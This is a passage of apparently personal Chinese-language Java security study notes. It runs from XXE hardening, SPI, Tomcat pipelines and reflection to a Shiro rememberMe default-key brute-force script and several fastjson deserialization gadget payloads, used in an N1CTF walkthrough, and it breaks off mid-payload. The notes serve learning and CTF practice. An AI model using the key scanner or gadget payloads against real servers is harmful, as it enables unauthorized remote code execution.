class="hljs-regexp">//</span>如果不能禁用DTDs,可以使用下两项，必须两项同时存在dbf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, false);        <span class="hljs-regexp">//</span>防止外部实体POC dbf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, false);   <span class="hljs-regexp">//</span>防止参数实体POC</code></pre></div><h2 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h2><p>全称为Service Provider Interface，是一种服务发现机制。</p><p>通过在ClassPath路径下的<code>META-INF/services</code>文件夹查找文件，<strong>自动加载文件里所定义的类</strong></p><p>不知道哪出了问题，尝试不成功，只能拿大佬的图</p><p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124151214.png" alt="image-20230918124151214"></p><div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> com.yyds;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">SPIService</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span></span>;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs angelscript">package com.yyds;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-symbol">SpiImpl</span> <span class="hljs-symbol">implements</span> <span class="hljs-symbol">SPIService</span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> execute() &#123;        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;SpiImpl 已经执行&quot;</span>);    &#125;&#125;</code></pre></div><p>在ClassPath路径下的resources中添加一个文件夹（即图中META-INF&#x2F;services）</p><p>再建文件名为<strong>包名+类名</strong>     内容为<strong>要执行的类</strong>的<code>包名+类名</code></p><p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124447218.png" alt="image-20230918124447218"></p><p>我们有两种方式可以实现，一种是通过<code>ServiceLoad.load()</code>方法，由<code>java.util</code>包提供</p><p>另一种是通过<code>Service.providers</code>方法拿到实现类的实例，由<code>sum.misc.Service</code>提供</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.yyds;<span class="hljs-keyword">import</span> sun.misc.Service;<span class="hljs-keyword">import</span> java.util.Iterator;<span class="hljs-keyword">import</span> java.util.ServiceLoader;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        Iterator&lt;SPIService&gt; providers = Service.providers(SPIService.class);        ServiceLoader&lt;SPIService&gt; load = ServiceLoader.load(SPIService.class);        <span class="hljs-keyword">while</span>(providers.hasNext()) &#123;            <span class="hljs-type">SPIService</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> providers.next();            ser.execute();        &#125;        System.out.println(<span class="hljs-string">&quot;--------------------------------&quot;</span>);        Iterator&lt;SPIService&gt; iterator = load.iterator();        <span class="hljs-keyword">while</span>(iterator.hasNext()) &#123;            <span class="hljs-type">SPIService</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> iterator.next();            ser.execute();        &#125;    &#125;&#125;</code></pre></div><p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124638694.png" alt="image-20230918124638694"></p><h3 id="存在安全问题"><a href="#存在安全问题" class="headerlink" title="存在安全问题"></a>存在安全问题</h3><p>写一个恶意类，导致命令执行</p><p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124744831.png" alt="image-20230918124744831"></p><p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124755156.png" alt="image-20230918124755156"></p><h2 id="tomcat中容器的pipeline机制"><a href="#tomcat中容器的pipeline机制" class="headerlink" title="tomcat中容器的pipeline机制"></a>tomcat中容器的pipeline机制</h2><p>tomcat由Connector和Container两部分组成，有四种Container实现类，分别是StandardEngine、StandardHost、StandardContext、SrandardWrapper</p><p>请求到达<code>Engine</code>容器时，先调用了自己的一个组件去处理，这个组件是<code>pipeline</code>，相关的还有个容器内部的组件叫做<code>value</code>组件</p><p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918141720888.png" alt="image-20230918141720888"></p><p>pipeline 管道    value 阀门</p><p><code>first</code>指向的是容器第一个非基础阀门的阀门，<code>first</code>在只有一个基础阀的时候并不会指向基础阀，因为如果指向基础阀的话就不需要判断非空然后返回基础阀了，这是个需要注意的点！</p><h2 id="类加载隔离方法"><a href="#类加载隔离方法" class="headerlink" title="类加载隔离方法"></a>类加载隔离方法</h2><h3 id="类隔离技术"><a href="#类隔离技术" class="headerlink" title="类隔离技术"></a>类隔离技术</h3><p>举例：</p><p>A、B两个jar包分别依赖了C的v1和v2版本，v2版本的Log类比v1版本新增了error方法，现在工程里面同时引入A和B两个jar包，以及C的v1和v2版本，打包时maven只能选择一个版本</p><p>默认情况下同一个项目的所有类都是用同一个类加载器加载的，所以不管你依赖了多少个版本的C，最终只会加载一个版本到<code>JVM</code>中</p><p>要是选择<code>v1</code>版本，当B去访问<code>Log.error</code>方法时就会抛出异常<code>java.lang.NoSuchMethodError</code></p><p>类冲突的问题若是向下兼容，把低版本排除即可，但若不向下兼容就陷入两难境地了</p><p>有人提出了类隔离技术来解决类冲突的问题</p><p>就是让每个模块使用独立的<strong>类加载器</strong>来加载</p><p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918171447416.png" alt="image-20230918171447416"></p><h3 id="实现类隔离"><a href="#实现类隔离" class="headerlink" title="实现类隔离"></a>实现类隔离</h3><h4 id="重写findClass"><a href="#重写findClass" class="headerlink" title="重写findClass"></a>重写findClass</h4><p>重写findClass会受到<strong>双亲委派机制</strong>的影响、不符合类隔离的目标</p><h4 id="重写loadClass"><a href="#重写loadClass" class="headerlink" title="重写loadClass"></a>重写loadClass</h4><h2 id="反射修改final修饰的变量"><a href="#反射修改final修饰的变量" class="headerlink" title="反射修改final修饰的变量"></a>反射修改final修饰的变量</h2><p>modifiers实际就是一个int类型的<code>26</code>，并且每个修饰符都有一个int的值，比如private是<code>2</code>，static是<code>8</code>，final是<code>16</code>那么我们只需要把目标属性的modifiers属性减去16，就相当于去除了final属性，而图中取反然后按位与操作就是这一步骤</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.yyds;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestReflection</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abc&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">TestReflection</span> <span class="hljs-variable">testReflection</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestReflection</span>();        <span class="hljs-type">Field</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> testReflection.getClass().getDeclaredField(<span class="hljs-string">&quot;test&quot;</span>);        <span class="hljs-type">Field</span> <span class="hljs-variable">modifier</span> <span class="hljs-operator">=</span> test.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);        modifier.setAccessible(<span class="hljs-literal">true</span>);        modifier.setInt(test,test.getModifiers() &amp; ~Modifier.FINAL);        test.set(testReflection,<span class="hljs-string">&quot;success&quot;</span>);        System.out.println(test.get(testReflection));    &#125;&#125;</code></pre></div><h1 id="基础链条"><a href="#基础链条" class="headerlink" title="基础链条"></a>基础链条</h1><h2 id="CC1-CC7"><a href="#CC1-CC7" class="headerlink" title="CC1-CC7"></a>CC1-CC7</h2><h2 id="shiro550-shiro-721"><a href="#shiro550-shiro-721" class="headerlink" title="shiro550     shiro 721"></a>shiro550     shiro 721</h2><p>1.2.4版本之前，固定key（kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;）加密</p><p>1.2.4以上的版本如何判断密钥是否正确呢？文章 <a href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&mid=2247485052&idx=1&sn=b007a722e233b45982b7a57c3788d47d&scene=21#wechat_redirect">一种另类的 shiro 检测方式</a>提供了思路，当密钥不正确或类型转换异常时，目标 Response 包含 <code>Set-Cookie：rememberMe=deleteMe</code> 字段，而当密钥正确且没有类型转换异常时，返回包不存在 <code>Set-Cookie：rememberMe=deleteMe</code> 字段。</p><p>因此我们需要构造 payload 排除类型转换错误，进而准确判断密钥。</p><p>shiro 在 1.4.2 版本之前， AES 的模式为 CBC， IV 是随机生成的，并且 IV 并没有真正使用起来，所以整个 AES 加解密过程的 key 就很重要了，正是因为 AES 使用 Key 泄漏导致反序列化的 cookie 可控，从而引发反序列化漏洞。在 1.4.2 版本后，shiro 已经更换加密模式 AES-CBC 为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> uuid<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_AES_GCM</span>(<span class="hljs-params">msg, secretKey</span>):    aesCipher = AES.new(secretKey, AES.MODE_GCM)    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)    <span class="hljs-keyword">return</span> (ciphertext, aesCipher.nonce, authTag) <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>(<span class="hljs-params">target</span>):    keys = [<span class="hljs-string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>, <span class="hljs-string">&#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;</span>,<span class="hljs-string">&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;</span>, <span class="hljs-string">&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;</span>]     <span class="hljs-comment"># 此处简单列举几个密钥</span>    BS = AES.block_size    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()    mode = AES.MODE_CBC    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span>     file_body = base64.b64decode(<span class="hljs-string">&#x27;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#x27;</span>)    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> keys:        <span class="hljs-keyword">try</span>:            <span class="hljs-comment"># CBC加密</span>            encryptor = AES.new(base64.b64decode(key), mode, iv)            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))            res = requests.get(target, cookies=&#123;<span class="hljs-string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;,timeout=<span class="hljs-number">3</span>,verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)            <span class="hljs-keyword">if</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>) == <span class="hljs-literal">None</span>:                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确KEY ：&quot;</span> + key)                <span class="hljs-keyword">return</span> key            <span class="hljs-keyword">else</span>:                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>):                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)                    <span class="hljs-keyword">return</span> key            <span class="hljs-comment"># GCM加密</span>            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))            base64_ciphertext = base64.b64encode(encryptedMsg[<span class="hljs-number">1</span>] + encryptedMsg[<span class="hljs-number">0</span>] + encryptedMsg[<span class="hljs-number">2</span>])            res = requests.get(target, cookies=&#123;<span class="hljs-string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="hljs-number">3</span>, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)             <span class="hljs-keyword">if</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>) == <span class="hljs-literal">None</span>:                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确KEY:&quot;</span> + key)                <span class="hljs-keyword">return</span> key            <span class="hljs-keyword">else</span>:                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>):                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)                    <span class="hljs-keyword">return</span> key            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)            <span class="hljs-keyword">return</span> key        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-built_in">print</span>(e)</code></pre></div><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>服务端   客户端    注册中心</p><p>xx打xx的多个方式（实际上就是在读代码）</p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">RemoteObj</span> <span class="hljs-keyword"><span class="hljs-keyword">extends</span> <span class="hljs-type">Remote</span></span> </span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> sayHello(<span class="hljs-keyword">String</span> keywords) throws RemoteException;  &#125;</code></pre></div><p>实现该接口的类要继承 <code>UnicastRemoteObject</code> </p><p>如果不能继承 UnicastRemoteObject 就需要手工导出 </p><p><code>UnicastRemoteObject.exportObject(this, 0);</code></p><p>继承 UnicastRemoteObject 类，用于生成 Stub（存根）和 Skeleton（骨架）</p><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>new Reference()</p><p>new InitialContext()</p><h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><p>toJSONString() 调用getter</p><p>parse() 调用setter</p><p>parseObject()     既有parse 又有toJSON    所以 调用 setter和getter</p><p>getter自动调用还需要满足以下条件：</p><ul><li>方法名长度大于4</li><li>非静态方法</li><li>以get开头且第四个字母为大写</li><li>无参数传入</li><li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li></ul><p>setter自动调用需要满足以下条件：</p><ul><li>方法名长度大于4</li><li>非静态方法</li><li>返回值为void或者当前类</li><li>以set开头且第四个字母为大写</li><li>参数个数为1个</li></ul><p>没有指定@type的，无论是parse还是parseObject都无法调用setter</p><p>Fastjson的一些其它功能点就是在为类属性调用getter&#x2F;setter时会调用<code>smartMatch()</code>忽略掉<code>_ -</code>字符串</p><h3 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h3><p>TemplatesImpl链</p><ul><li>fastjson反序列化时需有<code>Feature.SupportNonPublicField</code>参数</li><li><code>_bytecodes[]</code>需进行base64编码</li><li><code>_bytecodes[]</code>中加载的类需为<code>AbstractTranslet</code>的子类</li><li><code>_name</code>不为null</li><li><code>_tfactory</code>不为null</li><li>payload中记得带<code>&quot;_outputProperties&quot;:&#123; &#125;</code>，毕竟要调用<code>getoutputProperties</code></li><li>bytesValue对_bytecodes进行解码</li></ul><p>JdbcRowSetImpl链</p><p>…….</p><h2 id="后面的就是自己看文章的随便记录，太难了。。。。。"><a href="#后面的就是自己看文章的随便记录，太难了。。。。。" class="headerlink" title="后面的就是自己看文章的随便记录，太难了。。。。。"></a>后面的就是自己看文章的随便记录，太难了。。。。。</h2><h3 id="FastJSON调用getter常用两种方式，1、-ref，2、JSONObject。"><a href="#FastJSON调用getter常用两种方式，1、-ref，2、JSONObject。" class="headerlink" title="FastJSON调用getter常用两种方式，1、$ref，2、JSONObject。"></a>FastJSON调用getter常用两种方式，1、$ref，2、JSONObject。</h3><p>$ref：&gt;&#x3D;1.2.36</p><p>JSONObject：&lt;&#x3D;1.2.36</p><div class="code-wrapper"><pre><code class="hljs perl"><span class="hljs-number">1.2</span>.<span class="hljs-number">25</span>-<span class="hljs-number">1.2</span>.<span class="hljs-number">32</span>版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；<span class="hljs-number">1.2</span>.<span class="hljs-number">33</span>-<span class="hljs-number">1.2</span>.<span class="hljs-number">47</span>版本：无论是否开启AutoTypeSupport，都能成功利用；&#123;<span class="hljs-string">&quot;x&quot;</span>:&#123;<span class="hljs-string">&quot;xxx&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;www&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<span class="hljs-string">&quot;driverClassLoader&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;$$BCEL$$.....&quot;</span>&#125;&#125;:&#123;&#125;&#125;&#125;</code></pre></div><p>1.2.25-1.2.47都行，若不行，说明版本在1.2.25-1.2.32之间</p><p><strong>要想使用$ref赋值，则不能使用JSONObject调用getter</strong>，因为在parse时就会调用到getter方法，无法等到处理完$ref的任务后再调用getter</p><p>$ref要想在低版本(&lt;&#x3D;1.2.36)调用getter，要进行绕过</p><p>小于1.2.36 $ref调用getter</p><div class="code-wrapper"><pre><code class="hljs perl"><span class="hljs-comment">#恶意类放入mapping</span>[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,]</code></pre></div><div class="code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment">#调用getter</span>[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>, <span class="hljs-string">&quot;driverClassLoader&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>[1]&quot;</span>&#125;, <span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>.....&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>,<span class="hljs-string">&quot;&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;connection&quot;</span>:&#123;&#125;&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>.connection&quot;</span>&#125;&#125;]</code></pre></div><p>源码分析，只能说每一步都是细节</p><h3 id="通过N1CTF了解做题顺序，以及后续操作"><a href="#通过N1CTF了解做题顺序，以及后续操作" class="headerlink" title="通过N1CTF了解做题顺序，以及后续操作"></a>通过N1CTF了解做题顺序，以及后续操作</h3><p>普通Tomcat项目的JSON.parse，题目改成了SpringBoot fastJsonHttpMessageConverters。</p><p>路径故意报错，看后端框架为springboot</p><p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161328311.png" alt="image-20230924161328311"></p><p>指定@type</p><p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161506267.png" alt="image-20230924161506267"></p><p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161445816.png" alt="image-20230924161445816"></p><p>@type提交后发现后端产生了异常，而将@type放到value时不会产生异常，能够知道是因为设置了期望类导致type not match的原因，能够想到是SpringBoot常用FastJSON HttpMessageConverters方式。</p><p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161726647.png" alt="image-20230924161726647"></p><p>返回正常说明fastjson版本&lt;1.2.48</p><p>改为<code>www.baidu.com</code></p><p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161839000.png" alt="image-20230924161839000"></p><p>报错说明不存在DNS配置或不出网</p><p>然后去找是否存在RCE的利用类</p><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;a&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;b&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.BasicDataSource</span> org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.dbcp2</span><span class="hljs-selector-class">.BasicDataSource</span> org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ibatis</span><span class="hljs-selector-class">.datasource</span><span class="hljs-selector-class">.unpooled</span><span class="hljs-selector-class">.UnpooledDataSource</span>  (mybatis)</code></pre></div><p>发现是mybatis，直接</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;xxx&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;www&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;driver&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$$BCEL$$.....&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>一般就可以了</p><h4 id="这题的后续操作"><a href="#这题的后续操作" class="headerlink" title="这题的后续操作"></a>这题的后续操作</h4><p>但这里报错，说明版本在1.2.25 - 1.2.32</p><p>然后就是上面的$ref在低版本绕过调用getter</p><p>把数组放在value的位置</p><p>记得先放入mapping</p><div class="code-wrapper"><pre><code class="hljs powershell">&#123;<span class="hljs-string">&quot;x&quot;</span>:[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>, <span class="hljs-string">&quot;driverClassLoader&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>[1]&quot;</span>&#125;, <span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>,<span class="hljs-string">&quot;&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;connection&quot;</span>:&#123;&#125;&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span 